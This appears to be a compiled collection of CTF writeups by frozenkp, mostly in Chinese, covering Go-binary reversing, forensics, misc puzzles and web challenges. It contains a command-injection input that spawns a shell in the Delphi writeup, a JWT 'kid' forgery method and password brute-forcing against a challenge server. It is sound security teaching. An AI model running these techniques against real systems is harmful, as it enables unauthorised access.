<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-frozenkp
description: CTF writeups and security challenges by frozenkp.
---

# Writeups by frozenkp

Source repository: `/repos/frozenkp`

## Repository Index

- CTF/README.md
- CTF/others/pwnable.tw/Start/README.md
- CTF/others/pwnable.tw/criticalheap/README.md
- CTF/others/pwnable.tw/dubblesort/README.md
- CTF/others/pwnable.tw/hacknote/README.md
- CTF/others/pwnable.tw/orw/README.md
- CTF/2020/AIS3_pre-exam/README.md
- CTF/2018/BambooFox_CTF_2018/infant-gogogo/README.md
- CTF/2018/BambooFox_CTF_2018/infant-gotoheaven/README.md
- CTF/2018/BambooFox_CTF_2018/water-impossible/README.md
- CTF/2018/ASIS_CTF_qual/web/Buy_flags/README.md
- CTF/2018/ASIS_CTF_qual/misc/Plastic/README.md
- CTF/2018/ASIS_CTF_qual/forensic/Trashy_Or_Classy/README.md
- CTF/2017/seccon_CTF/programming/Qubic_Rube/README.md
- CTF/2017/seccon_CTF/programming/putchar_music/README.md
- CTF/2017/HITB_CTF/WEB/Pasty/README.md
- CTF/2017/HITB_CTF/MISC/2017_Dating_in_Singapore/README.md
- CTF/2017/HITB_CTF/MISC/Flying_High/README.md
- CTF/2015/B-Sides_Vancouver/Delphi/README.md
- CTF/2014/NoConName_qual/inBINcible/README.md

## Writeup Content


### File: CTF/2014/NoConName_qual/inBINcible/README.md

# inBINcible

> Challenge Link: Nope
>
> Category: reverse

Get the key. The flag is: “NcN_” + sha1sum(key)

[inbincible](https://mega.co.nz/#!sER23Y6Q!zN_jO3hT6q8onHj6B-qFeapb7vif81omSa2Ap0Or9Kk)

## 觀察

這支程式執行後直接輸出 `Nope!` ，沒有任何輸入

```
% ./inbincible                   
Nope!
```

### 起手式

這個執行檔是 32 位元的，且是 static link

```
% file inbincible
inbincible: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

發現 `main.main` 應該是 go 的執行檔

```
% objdump -M intel -d inbincible
inbincible：     檔案格式 elf32-i386


Disassembly of section .text:

08048c00 <main.main>:
 8048c00:       65 8b 0d 00 00 00 00    mov    ecx,DWORD PTR gs:0x0
 8048c07:       8b 89 f8 ff ff ff       mov    ecx,DWORD PTR [ecx-0x8]
 8048c0d:       8d 44 24 c0             lea    eax,[esp-0x40]
 8048c11:       3b 01                   cmp    eax,DWORD PTR [ecx]
 8048c13:       77 0b                   ja     8048c20 <main.main+0x20>
 8048c15:       31 ff                   xor    edi,edi
 8048c17:       31 c0                   xor    eax,eax
 ...
```

### go 起手式

總共有兩個函式在 main package 中

```
% go tool objdump inbincible | grep 'TEXT main\.' 
TEXT main.main(SB) /home/n/ctf/ncn_quals_2014/rev400/main.go
TEXT main.func.001(SB) /home/n/ctf/ncn_quals_2014/rev400/main.go
TEXT main.init(SB) /home/n/ctf/ncn_quals_2014/rev400/main.go
```

### 分析 main

過程中發現有取出 `os.Args`，可能是藉由參數輸入

```
   0x8048ef1 <main.main+753>:   cmp    DWORD PTR ds:0x814e17c,0x1
   0x8048ef8 <main.main+760>:   jbe    0x804937d <main.main+1917>
=> 0x8048efe <main.main+766>:   mov    ebx,DWORD PTR ds:0x814e178
   0x8048f04 <main.main+772>:   add    ebx,0x8
   0x8048f07 <main.main+775>:   mov    esi,DWORD PTR [ebx+0x4]
```

```
gdb-peda$ x/10gx 0x814e178
0x814e178 <os.Args>:    0x0000000218300000      0x0000000000000002
0x814e188 <persistent>: 0xf7fc91a400000000      0x00000000f7ff9000
0x814e198 <reflect.dummy>:      0x0000000000000000      0x0000000000000000
0x814e1a8 <sync.allPools>:      0x000000000814e03c      0x0000000000000000
0x814e1b8 <syscall.envs>:       0x0000004e1830e000      0x000000000000004e
```

接著比較 `esi` 和 `ebp` ，此時的 `ebp` 是固定的 `0x10` ，而 `esi` 是參數的長度

猜測參數長度應該要是 `0x10`

```
   0x8048f07 <main.main+775>:   mov    esi,DWORD PTR [ebx+0x4]
   0x8048f0a <main.main+778>:   mov    ebx,DWORD PTR [esp+0x6c]
   0x8048f0e <main.main+782>:   mov    ebp,DWORD PTR [ebx+0x4]
=> 0x8048f11 <main.main+785>:   cmp    esi,ebp
   0x8048f13 <main.main+787>:   je     0x8049048 <main.main+1096>
   0x8048f19 <main.main+793>:   xor    ecx,ecx
   0x8048f1b <main.main+795>:   mov    ebp,DWORD PTR [esp+0x88]
```

### 分析 func.001

在中間發現 reverse 題常見的 xor ，目標是 `ecx` 及 `ebp` 

此時的 `ecx` 是 `0x12` ，`ebp` 則是參數的第一個字`x47 ( 'G' ) `

```
0x8049456 <main.func+150>:   xor    ecx,ebp
```

接著比較了 `cl` 及 `al`

此時的 `cl` 是 xor 的結果，`al` 是前面取出的值

```
0x804946a <main.func+170>:   cmp    cl,al
```

如果兩者一樣的話，會透過 go channel 送出 0x1 給 main

猜測可能是只要 16 個字經過 xor 以後都一樣就可以通過了

## 解法

因為 xor 可以直接使用一樣的 key 來找到原始字串，所以只要取出 xor key 以及最後的答案就可以了

### xor key

實際查看該位置後發現 key 只有 5 bytes ，經過測試後發現這 5 bytes 會一直循環

也就是 `0x12, 0x45, 0x33, 0x87, 0x65, 0x12, 0x45, 0x33, 0x87, 0x65, 0x12, 0x45, 0x33, 0x87, 0x65, 0x12`

```
gdb-peda$ x/2gx 0x18300024-0x8
0x1830001c:     0x4533876500000000      0x0000000000000012
```

### ans

```
gdb-peda$ x/2gx 0x18300040
0x18300040:     0x0306330bb6447555      0x3344b247716002e9
```

### xor

將兩個字串經過 xor 以後就可以得到原字串 `G0w1n!C0ngr4t5!!`


### File: CTF/2015/B-Sides_Vancouver/Delphi/README.md

# Delphi

> Challenge link: Nope
>
> Category: reverse

[delphi](https://github.com/ctfs/write-ups-2015/blob/master/bsides-vancouver-ctf-2015/ownable/delphi/delphi-07a5c9d07a4c20ae81a2ddc66b9602d0dcceb74b)

[libtwenty.so](https://github.com/ctfs/write-ups-2015/blob/master/bsides-vancouver-ctf-2015/ownable/delphi/libtwenty.so-4a3918b2efd9fbdfd20eeb8fa51ca76bc42eb2f2)

## Observation

因為有額外給的 Library ，所以要執行(分析)的時候要搭配 `LD_LIBRARY_PATH=.` 將當前資料夾指定給 Library 路徑

```bash
$ LD_LIBRARY_PATH=. ./delphi 
Welcome!

Are you ready to play 20 questions? No? Perfect!
I'm thinking of something big, metal, and orange. Go!
> test
Who's that?
> deadbeef
Who's that?
>
```

### file

```bash
$ file ./delphi 
./delphi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=70886b932f383987896e371d422ab8a4089bd148, not stripped
```

### go binary

Objdump 後發現 `main.main` ，是 go 的 binary 檔，其中在 main package 中有兩個比較特別的 function

- main.doTheMagic
- main._Cfunc_check_answer (cgo 的 function)

``` bash
$ objdump -d delphi | grep '.*main.*>:'
0000000000400df0 <__libc_start_main@plt>:
0000000000401280 <main.main>:
0000000000401c30 <main.doTheMagic>:
0000000000401df0 <main.init>:
00000000004021c0 <main._Cfunc_CString>:
0000000000402230 <main._Cfunc_check_answer>:
0000000000402270 <main._Cfunc_free>:
0000000000411b20 <runtime.main>:
00000000004295b0 <main>:
```

## Solution

### Input

一開始先找看看輸入的地方

``` bash
$ go tool objdump delphi | grep '.*main\.go.*Scan'
        main.go:34      0x4016ee        bd30b74f00                      MOVL $bufio.ScanLines.f(SB), BP
        main.go:35      0x401755        e816b80200                      CALL bufio.(*Scanner).Scan(SB)
```

```bash
   0x401747 <main.main+1223>:   mov    QWORD PTR [rsp+0x48],rax
   0x40174c <main.main+1228>:   mov    rbx,QWORD PTR [rsp+0x48]
   0x401751 <main.main+1233>:   mov    QWORD PTR [rsp],rbx
=> 0x401755 <main.main+1237>:   call   0x42cf70 <bufio.(*Scanner).Scan>
   0x40175a <main.main+1242>:   movzx  rbx,BYTE PTR [rsp+0x8]
   0x401760 <main.main+1248>:   cmp    bl,0x0
   0x401763 <main.main+1251>:   je     0x4018b1 <main.main+1585>
   0x401769 <main.main+1257>:   mov    rdi,QWORD PTR [rsp+0x48]
Guessed arguments:
arg[0]: 0xc208028130 --> 0x0 
arg[1]: 0x7ffff7e20df0 --> 0xc208020000 --> 0x0 
```

輸入 deadbeef 後繼續觀察

發現後面出現一段有趣的比較，此時的 `rdx` 是輸入的長度，`rax` 是 'go' 的長度

由底下 `jl` 和 `jb` 可知 **輸入不能小於 2 **

```bash
RAX: 0x2 
RBX: 0x4d7f60 --> 0x4d7f70 --> 0x6f67 ('go')
RCX: 0x66656562 ('beef')
RDX: 0x8 
RSI: 0x4d7f70 --> 0x6f67 ('go')
RDI: 0xc208000260 ("deadbeef")
RBP: 0x7ffff7fb3000 --> 0x781d28 (0x00007ffff7fb3000)
RSP: 0x7ffff7e20dc0 --> 0xc208013000 ("deadbeef\n")
[-------------------------------------code-------------------------------------]
   0x401939 <main.main+1721>:   mov    rax,QWORD PTR [rbx+0x8]
   0x40193d <main.main+1725>:   mov    QWORD PTR [rsp+0x90],rdx
   0x401945 <main.main+1733>:   mov    QWORD PTR [rsp+0xb0],rax
=> 0x40194d <main.main+1741>:   cmp    rdx,rax
   0x401950 <main.main+1744>:   jl     0x401baa <main.main+2346>
   0x401956 <main.main+1750>:   cmp    rdx,rax
   0x401959 <main.main+1753>:   jb     0x401bb2 <main.main+2354>
   0x40195f <main.main+1759>:   mov    QWORD PTR [rsp+0xb8],rdi
```

再往下看，出現了 `runtime.eqstring` 

比較的目標是 輸入 ( 'deadbeef' ) 以及 'go' 的前兩個 byte (0x2)

```bash
   0x401986 <main.main+1798>:   mov    QWORD PTR [rsp+0x18],rax
=> 0x40198b <main.main+1803>:   call   0x425600 <runtime.eqstring>
   0x401990 <main.main+1808>:   movzx  rbx,BYTE PTR [rsp+0x20]
[------------------------------------stack-------------------------------------]
0000| 0x7ffff7e20dc0 --> 0xc208000260 ("deadbeef")
0008| 0x7ffff7e20dc8 --> 0x2 
0016| 0x7ffff7e20dd0 --> 0x4d7f70 --> 0x6f67 ('go')
0024| 0x7ffff7e20dd8 --> 0x2
```

實際測試一下，果然輸入開頭是 go 的話就會出現不一樣的結果

```bash
LD_LIBRARY_PATH=. ./delphi 
Welcome!

Are you ready to play 20 questions? No? Perfect!
I'm thinking of something big, metal, and orange. Go!
> goabcd
Sneaky, sneaky. Go where? How fast?
> go
Sneaky, sneaky. Go where? How fast?
> abcd
Who's that?
> 
```

比對正確後就會進入 `main.doTheMagic` 了

```bash
   0x401a0d <main.main+1933>:   mov    QWORD PTR [rsp+0x8],rax
=> 0x401a12 <main.main+1938>:   call   0x401c30 <main.doTheMagic>
   0x401a17 <main.main+1943>:   lea    rbx,ds:0x4d4060
```

### doTheMagic

繼續往下看，發現 `strings.Split` ，以空格( ' ' )作為切割點

繼續執行後就結束了

```bash
   0x401c77 <main.doTheMagic+71>:       mov    rdi,rbp
   0x401c7a <main.doTheMagic+74>:       movs   QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
   0x401c7c <main.doTheMagic+76>:       movs   QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
=> 0x401c7e <main.doTheMagic+78>:       call   0x44a480 <strings.Split>
   0x401c83 <main.doTheMagic+83>:       mov    rdx,QWORD PTR [rsp+0x20]
   0x401c88 <main.doTheMagic+88>:       mov    rax,QWORD PTR [rsp+0x28]
   0x401c8d <main.doTheMagic+93>:       mov    rcx,QWORD PTR [rsp+0x30]
   0x401c92 <main.doTheMagic+98>:       mov    QWORD PTR [rsp+0x68],rdx
Guessed arguments:
arg[0]: 0x7ffff7e20d40 --> 0x8 
arg[1]: 0x4d37d0 --> 0x20 (' ')
```

另外在後面可以找到 `main._Cfunc_check_answer`

```bash
401dbf:       e8 6c 04 00 00          callq  402230 <main._Cfunc_check_answer>
```

我猜可能輸入要用空格分成好幾段，因此我在 `main._Cfunc_check_answer` 設斷點，並填入不同數目的輸入測試，最後發現需要輸入共三段就會經過斷點，輸入格式如下

```
go <something> <something>
```

### check_answer

往下看發現他利用 `cgocall` 呼叫了 `0x400f80`

```bash
=> 0x402249 <main._Cfunc_check_answer+25>:      mov    eax,0x400f80
   0x40224e <main._Cfunc_check_answer+30>:      mov    QWORD PTR [rsp],rax
   0x402252 <main._Cfunc_check_answer+34>:      lea    rax,[rsp+0x18]
   0x402257 <main._Cfunc_check_answer+39>:      mov    QWORD PTR [rsp+0x8],rax
   0x40225c <main._Cfunc_check_answer+44>:      call   0x404da0 <runtime.cgocall>
```

```bash
gdb-peda$ x/5gi 0x400f80
   0x400f80 <_cgo_de3376964270_Cfunc_check_answer>:     mov    rsi,QWORD PTR [rdi+0x8]
   0x400f84 <_cgo_de3376964270_Cfunc_check_answer+4>:   mov    edi,DWORD PTR [rdi]
   0x400f86 <_cgo_de3376964270_Cfunc_check_answer+6>:   jmp    0x400de0 <check_answer@plt>
   0x400f8b:    nop    DWORD PTR [rax+rax*1+0x0]
   0x400f90 <_cgo_de3376964270_Cfunc_free>:     mov    rdi,QWORD PTR [rdi]
```

要追進去的話，建議是在 `0x400f80` 設斷點，接著 continue 過去，避免中途沒跟到

最後會回到 check_answer

``` bash
=> 0x7ffff7bd5758 <check_answer>:       push   rbp
   0x7ffff7bd5759 <check_answer+1>:     mov    rbp,rsp
   0x7ffff7bd575c <check_answer+4>:     sub    rsp,0xa0
   0x7ffff7bd5763 <check_answer+11>:    mov    DWORD PTR [rbp-0x94],edi
   0x7ffff7bd5769 <check_answer+17>:    mov    QWORD PTR [rbp-0xa0],rsi
```

往下追會出現一個有趣的東西

此時的 `eax` 是最後一段輸入的值，因為我輸入的是 `go abc def` ，所以這邊的 eax 因爲轉不出來所以變成 0

add 後變成 42，由此可知 [rbp-0x2] 原始值應該是 42

```bash
   0x7ffff7bd5789 <check_answer+49>:    mov    eax,DWORD PTR [rbp-0x94]
=> 0x7ffff7bd578f <check_answer+55>:    add    WORD PTR [rbp-0x2],ax
   0x7ffff7bd5793 <check_answer+59>:    movzx  eax,WORD PTR [rbp-0x2]
   0x7ffff7bd5797 <check_answer+63>:    cmp    eax,0x4
   0x7ffff7bd579a <check_answer+66>:    ja     0x7ffff7bd57ed <check_answer+149>
```

如果比較符合後跳過去，會出現 `strcat` 以及 `system` 

在 stack 中可以看到 ’echo' 以及第二段輸入 'abc' ，看來是合成 'echo abc' 以後利用 system 執行

```bash
=> 0x7ffff7bd57d7 <check_answer+127>:   call   0x7ffff7bd5650 <strcat@plt>
   0x7ffff7bd57dc <check_answer+132>:   lea    rax,[rbp-0x90]
   0x7ffff7bd57e3 <check_answer+139>:   mov    rdi,rax
   0x7ffff7bd57e6 <check_answer+142>:   call   0x7ffff7bd5630 <system@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe4f0 --> 0x788170 --> 0x636261 ('abc')
0008| 0x7fffffffe4f8 --> 0x0 
0016| 0x7fffffffe500 --> 0x206f686365 ('echo ')
```

綜合上述，我們應該要使 42 + {number} >= 4

這裡有個有趣的地方，他在取值的時候是使用 WORD (2 bytes) 來取，當這裡的值超過 WORD 上限時就會歸零，我們可以利用這個點來達成上述的條件

```
number = 2^16 - 42 + eax
```

### command injection

前面有看到組合的 'echo abc' ，此時可以利用 `;` 來進行 command injection 來拿到 shell

```bash
$ LD_LIBRARY_PATH=. ./delphi 
Welcome!

Are you ready to play 20 questions? No? Perfect!
I'm thinking of something big, metal, and orange. Go!
> go abc;/bin/sh 65498				# 2^16 - 42 + 4 (eax = 4)
abc
$ ls
delphi  libtwenty.so  peda-session-delphi.txt
$ 
```


### File: CTF/2017/HITB_CTF/MISC/2017_Dating_in_Singapore/README.md

# 2017, Dating in Singapore

> Challenge Link: [2017, Dating in Singapore](http://hitb.xctf.org.cn/contest_challenge/)
>
> Category: MISC

01081522291516170310172431-050607132027162728-0102030209162330-02091623020310090910172423-02010814222930-0605041118252627-0203040310172431-0102030108152229151617-04050604111825181920-0108152229303124171003-261912052028211407-04051213192625

## 分析字串

- 用 - 分隔的話共有12段
- 每段的長度不一樣，但都是雙數

## 嘗試

- 每兩個一組轉成ascii -> 沒意思
- 轉成hex -> 沒意思

## 解法

- 觀察標題 “2017, Dating in Singapore” -> 可能跟日期有關
- 發現每兩個一組都不會超過31，又共有12個月
- 找到新加坡2017的月曆後將對應的日期標記出來

![](http://i.imgur.com/jJpjlMX.png)


### File: CTF/2017/HITB_CTF/MISC/Flying_High/README.md

# Flying_High

> Challenge Link: [Flying_High](http://hitb.xctf.org.cn/contest_challenge/)
>
> Category: MISC

We found a crashed drone, are you able to recover information what this drone was doing?
[Flying_High.tar.gz](http://hitb.xctf.org.cn/media/task/158195de-cd06-4837-98e5-1129101fb2e4.gz):43ce56686b4f38b68108140825434f76bfed47530a92f3a6469c202746c257f2

## 分析

附件打開後有四個binanry檔

```
image0.bin
image1.bin
image2.bin
image3.bin
```

用binwalk發現裡面有很多檔案

```
DECIMAL HEXADECIMAL DESCRIPTION
0 0x0 UBIFS filesystem superblock node, CRC: 0x3A905A7, flags: 0x0, min I/O unit size: 2048, erase block size: 126976, erase block count: 58, max erase blocks: 58, format version: 4, compression type: none
…
262144 0x40000 UBIFS filesystem master node, CRC: 0x40782ADA, highest inode: 72, commit number: 61
264192 0x40800 UBIFS filesystem master node, CRC: 0x6D072259, highest inode: 72, commit number: 62
266240 0x41000 UBIFS filesystem master node, CRC: 0x13DCBFF9, highest inode: 72, commit number: 63
268288 0x41800 UBIFS filesystem master node, CRC: 0x1EDB0C74, highest inode: 73, commit number: 64
270336 0x42000 UBIFS filesystem master node, CRC: 0x5E9D0073, highest inode: 73, commit number: 65
272384 0x42800 UBIFS filesystem master node, CRC: 0xFF510C2, highest inode: 74, commit number: 66
274432 0x43000 UBIFS filesystem master node, CRC: 0xB70FE71F, highest inode: 74, commit number: 67
1525808 0x174830 XML document, version: "1.0"
1527856 0x175030 XML document, version: "1.0"
1529904 0x175830 XML document, version: "1.0"
1531952 0x176030 XML document, version: "1.0"
1534000 0x176830 XML document, version: "1.0"
1536048 0x177030 XML document, version: "1.0"
1538168 0x177878 XML document, version: "1.0"
1540144 0x178030 XML document, version: "1.0"
1542192 0x178830 XML document, version: "1.0"
1544240 0x179030 XML document, version: "1.0"
1546288 0x179830 XML document, version: "1.0"
1548336 0x17A030 XML document, version: "1.0"
1550384 0x17A830 XML document, version: "1.0"
1552432 0x17B030 XML document, version: "1.0"
1554480 0x17B830 XML document, version: "1.0"
1556528 0x17C030 XML document, version: "1.0"
1558576 0x17C830 XML document, version: "1.0"
1560624 0x17D030 Zip archive data, at least v2.0 to extract, compressed size: 3725, uncompressed size: 23763, name: FVT1_MB\FVT1_MB.xml
1564398 0x17DEEE Zip archive data, at least v2.0 to extract, compressed size: 1414, uncompressed size: 5298, name: FVT1_MB\SETTINGS\SETTINGS_FVT1_MB_TESTER_1.xml
1565936 0x17E4F0 Zip archive data, at least v2.0 to extract, compressed size: 433, uncompressed size: 1440, name: FVT1_MB\TRACE.xml
1566416 0x17E6D0 Zip archive data, at least v2.0 to extract, compressed size: 1340, uncompressed size: 20339, name: HMI_1_TESTER.xml
1567802 0x17EC3A Zip archive data, at least v2.0 to extract, compressed size: 304, uncompressed size: 815, name: MAIN.xml
…
```

## 嘗試

每個binanry都dump出來看看，內含多個xml檔
- 稍微看了下，不太明白內容是啥
- 用strings掃過，沒找到hitb, flag之類的字眼

## 解法

- 用`file`確定檔案型別 -> 發現UBIfs
```
% file image0.bin
image0.bin: UBIfs image, sequence number 1, length 4096, CRC 0x03a905a7
```

- 利用[ubireader](https://github.com/jrspruitt/ubi_reader/)拉出完整的目錄結構
- 在image3.bin中發現一支影片

![flying_high](http://i.imgur.com/q4GsGiX.jpg)


### File: CTF/2017/HITB_CTF/WEB/Pasty/README.md

# Pasty

> Challenge Link: [Pasty](http://hitb.xctf.org.cn/contest_challenge/)
>
> Category: Web

Can you find the administrator's secret message?

## 分析

此題提供一個可以用帳密登入的記事本網站，目標是取得管理員帳密
- 發現登入後用jwt作為token來認證
- 只要改動token中，使用者的名字就可以達成了

## 嘗試

上網找jwt的漏洞之類的 -> 找到的不能用QQ

## 解法

jwt的header中有一個**kid**，這個代表的是公鑰的位址
-> 可以自己產生公私鑰，用私鑰加密後，把kid改成公鑰位址送回去

但是公鑰的位址在伺服器底下的目錄，所以要先把公鑰貼在pasty上，接著取出在伺服器上的位址貼進去

> 公鑰會自動加上.pem該如何處理？
>
> 在網址最後面加上?，讓.pem變成參數



### File: CTF/2017/seccon_CTF/programming/Qubic_Rube/README.md

# Qubic Rube

> Challenge Link: [Qubic_Rube](https://score-quals.seccon.jp/question/1a33d91bd704cbbc91e11b42bb27dba7812399ec)
>
> Category: programming

Please continue to solve Rubic's Cube and read QR code.

http://qubicrube.pwn.seccon.jp:33654

## Solution

This challenge is really a "**programming challenge**". Orz

This site give you a Rubik's Cube like the photo below, you should **solve** it and **scan** the QRcode. Then, you will get a link to the next Rubik's Cube......

![](https://i.imgur.com/MFFWlPd.png)

**Be careful: The URLs are not always the same color**

1. download all six images and split each one to nine parts.
2. categorized depend on the background color.
3. there are four possible pieces at same place because of rotation.
4. try every possible QRcode brutally to find the right one.

```
******************11ed5b705e72e9fa2e57******************
11 : (255, 213, 0)
SECCON 2017 Online CTF                                   
11 : (196, 30, 58)
Qubic Rube                                               
11 : (255, 88, 0)
Next URL is:                                             
11 : (255, 255, 255)
Have fun!                                                
11 : (0, 81, 186)
No. 11 / 50                                              
11 : (0, 158, 96)
http://qubicrube.pwn.seccon.jp:33654/12de86366ccad8ad3f0e
find at color (0, 158, 96)
******************12de86366ccad8ad3f0e******************
12 : (255, 213, 0)
No. 12 / 50                                              
12 : (196, 30, 58)
Next URL is:                                             
12 : (255, 88, 0)
Qubic Rube                                               
12 : (255, 255, 255)
http://qubicrube.pwn.seccon.jp:33654/131c139206e8120f4e89
find at color (255, 255, 255)
******************131c139206e8120f4e89******************
13 : (255, 213, 0)
Next URL is:
```

## Dependency

- [PIL](http://www.pythonware.com/products/pil/)
- [zbarlight](https://github.com/Polyconseil/zbarlight)



### File: CTF/2017/seccon_CTF/programming/putchar_music/README.md

# putchar music

> Challenge Link: [putchar_music](https://score-quals.seccon.jp/question/f6b2af4e26720b6a27b3efbca313097b977b2a8b)
>
> Category: programming

This one line of C program works on Linux Desktop. What is this movie's title? 
Please answer the flag as SECCON{MOVIES_TITLE}, replace all alphabets with capital letters, and spaces with underscores.

```c
main(t,i,j){unsigned char p[]="###<f_YM\204g_YM\204g_Y_H #<f_YM\204g_YM\204g_Y_H #+-?[WKAMYJ/7 #+-?[WKgH #+-?[WKAMYJ/7hk\206\203tk\\YJAfkkk";for(i=0;t=1;i=(i+1)%(sizeof(p)-1)){double x=pow(1.05946309435931,p[i]/6+13);for(j=1+p[i]%6;t++%(8192/j);)putchar(t>>5|(int)(t*x));}}
```

## Solution

I found a cool video "[Creating music in one line of C code](https://www.youtube.com/watch?v=L9KLnN0GczI)"on Youtube, and it looked similar to this challenge.

[![](https://i.imgur.com/5x3jXmM.png)](https://www.youtube.com/watch?v=L9KLnN0GczI)

Here is the instructions mentioned below the video:

1. Compile source code (main.c)

```sh
gcc main.c -lm
```

2. Play with mplayer

```sh
./a.out | mplayer -demuxer rawaudio -rawaudio rate=8000:channels=1:samplesize=1 -
```

Then you will get a cool music like [this](https://youtu.be/NJn6ZZ_Mnvg) !!




### File: CTF/2018/ASIS_CTF_qual/forensic/Trashy_Or_Classy/README.md

## Trashy Or Classy

> Challenge Link: [Trashy Or Classy](https://asisctf.com/challenges/)
>
> Category: forensic
>
> Writeup: [Trashy Or Classy](https://github.com/frozenkp/CTF/tree/master/2018/ASIS_CTF_qual/forensic/Trashy_Or_Classy)

Don't be [Trashy](https://asisctf.com/tasks/Trashy_Or_Classy_1afb5f5911a97860e181722b55dae50bb765285cd8dcbb38837d1a1094e53444). Try being Classy!!

## Solution

檔案載下來以後是一個 pcap

### pcap

用 wireshark 大概看一下，好像是在暴力搜 http://167.99.233.88 的子目錄

> Filter: http

![](https://i.imgur.com/iJHHeVn.png)

看看有成功找到的目錄，有一個回覆是有 Index 的

> Filter: http.response.code == 200

![](https://i.imgur.com/zCbt4kn.png)

![](https://i.imgur.com/4Mcvqzz.png)

實際到這個[網址](http://167.99.233.88/private/)去看，發現是要輸入帳密的，仔細研究一下這個封包，發現是 Digest Auth，且有一些資訊

利用這些資訊搭配 rockyou.txt ，暴力算出密碼是 `rainbow`

![](https://i.imgur.com/B8Sj616.png)

### Casync

連上去後，可以載到 `flag.caidx` ，不過還有一個資料夾 `flag.castr` 進不去，猜測可能是不能進去但知道檔名的情況下可以下載

根據檔名，找到了 [casync](https://github.com/systemd/casync) 和 [desync](https://github.com/folbricht/desync) 

> casync 在 ubuntu 17.10 上的版本會出現 Operaion not supported 的錯誤，需要自己編

我們使用 desync 加上自己接的 proxy (通過 Digest Auth) 從遠端 server 上把整份資料夾抓下來

```
% desync extract -s http://167.99.233.88/private/flag.castr/ flag.caidx flagdesync.tar
```

抓下來後看到一大堆的 chunk，大概翻了一遍還是不知道是幹嘛用的，結束後看 writeup 才知道要用 casync 把檔案還原 Orz

```
% casync extract --store=./flag.castr ./flag.caidx ./flag
```

還原後就拿到了一個 flag.png

![](https://i.imgur.com/SdPfcyH.png)


### File: CTF/2018/ASIS_CTF_qual/misc/Plastic/README.md

# Plastic

> Challenge Link: [Plastic](https://asisctf.com/challenges/)
>
> Category: misc
>
> Writeup: [Plastic](https://github.com/frozenkp/CTF/tree/master/2018/ASIS_CTF_qual/misc/Plastic)

Are LaTeX and [PlAsTiC](https://asisctf.com/tasks/plastic_b3a67f6e7ad52d6ca559d1aafa79c6fd6a80c73360664e7330dd6303d60b789b) the Same? It seems that they have very different compounds.

## Solution

檔案載下來是一個 PNG 檔

```
% file plastic
plastic: PNG image data, 1612 x 74, 8-bit/color RGBA, non-interlaced
```

![](https://i.imgur.com/lSItWe9.png)

 用 strings 看一下，可以發現奇怪的資料

```Xml
<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="XMP Core 5.4.0">
   <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
      <rdf:Description rdf:about=""
            xmlns:exif="http://ns.adobe.com/exif/1.0/"
            xmlns:tiff="http://ns.adobe.com/tiff/1.0/">
         <exif:UserComment>
            <rdf:Alt>
               <rdf:li xml:lang="x-default">AAAFWHjabVRfbBRFGJ/ZOeifa+m2hVJaoNf2iohQtndX9ipS29IeVuwVe/1zbfc4&#xA;5/bm7pbu7V5255DjaDISozExaggxSIxC+2KRqBhjCPFBQwgmPggtSnySFx98IP57&#xA;ML4590dEw2w2+33fzHzz+37fbyeW0TWbStIdKCDHuvUvngi7jxPL1kwj7DZjx4hK&#xA;7Vk3ttSUxsOTbmpmGgB85cLHYntFZXtHp7trx2M7H9/1RI+/78DgoWeC4zNhJarG&#xA;U7pp0ym3kdX1tapqZ02TayYY6l4gOXuOf8t5p92qjm17pXZDnVjf0LhxExMYYg62&#xA;jq1nFaySVbHqlc3NW1pat27b3sacrIZtYHWsnrWwVraNbWeucAzbRNcMMqWaumlN&#xA;ps04maIa1Uk4YxGcjukkksZJQ0toKqa8pMk4piQq1sWwupC0zKwRP1jYOGebWUsl&#xA;k+QE7QTlsbZ7j7N7rzQVDE0cGlKCoeLCUAarZFzcJXX3+fd5fL19/j6/S+qWJLnH&#xA;I/XxIXsLrkf2eX0Sj/YCEbLaVY/X1ztXKtbAaRIumcSeKadd2if/Y4aDofEiO6Jj&#xA;1fnk/qdmOV02tTQjycQjPFH/0xx+MDSWpZhXFyrOLPcPyHxfyVkbch4cHgk88Dn0&#xA;QcqtWJYSmzWwLawxKq4qcVPNpolBi0jme6QMjeSxRTVVJ4vVStYmvNIFnCTz3Cxg&#xA;tiP5IseLri4eibsSpsVfg7qK0Yd35HHatnPpGF+ZxjRl/3+uEHzU3HyWJvyRvGZk&#xA;OFJDLR2UyOouarpoLkNccc3ivOg5bmDV0jhWl5rCFlYp12t1QWajh8cuPss2XnyO&#xA;bWLN08FQgAO8c+T5CWdocmqa+yHtJOHEJAI6TtrcD/LCOgd2lhouiqyJbZ4eMw2s&#xA;mpzp2blyhqV5uWzxaOQoJ3RYUwtqwlZuKSLz4As4KjY8xHO8RP1STH5kvHNgqHTk&#xA;KnEmkoUfg2ocyOCXfrLwp/oT28pTasf4mcNcrUsLctkqKDK9Vwr0uPgDWG2h05mR&#xA;AGsr9fRAXoklXIOh0dCiku+V0l4l6stkbCWa7R1RomNeGXPx+5RofNyQlehonyFN&#xA;ECVKU96x9nZlkR+ZPR4VGx9I698al7MRuSi6wyRH4oPlq+B27uSkZZqUQVAJ6kEL&#xA;6AR7gAfIYB5gkAIZkAenwevgDfAWOAPOgrfBOXAevAveAx+AS+Ay+Ah8Aj4Fn4HP&#xA;wVVwDXwBboBvwC3wPfgR3Ae/Qwesg82wDXZBD4xCDFWYgjY8BV+Gr8I34Tl4Hr4P&#xA;V+CH8DK8Aq/Dm/AWvAvvwfvwF/gb/EP4WvhWuC2sCd8Jd4UfhHvCz8Kvwl8IoCrk&#xA;RLWoDjWhVtSButBu1IP60SAKoHl0FNnoFHoJvYbOoLPoHXQBLaNL6Aq6iq6hr9B1&#xA;dAPddFQ4ahwdjh0Ov2O/Y6DUQQGWr4s8+M9wDP0NfUGwlA==&#xA;</rdf:li>
            </rdf:Alt>
         </exif:UserComment>
         <tiff:Orientation>1</tiff:Orientation>
      </rdf:Description>
   </rdf:RDF>
</x:xmpmeta>
```

把中間那段整理一下，看起來是 23 段經過 base64 的字串，不過解開看不出來是啥

```
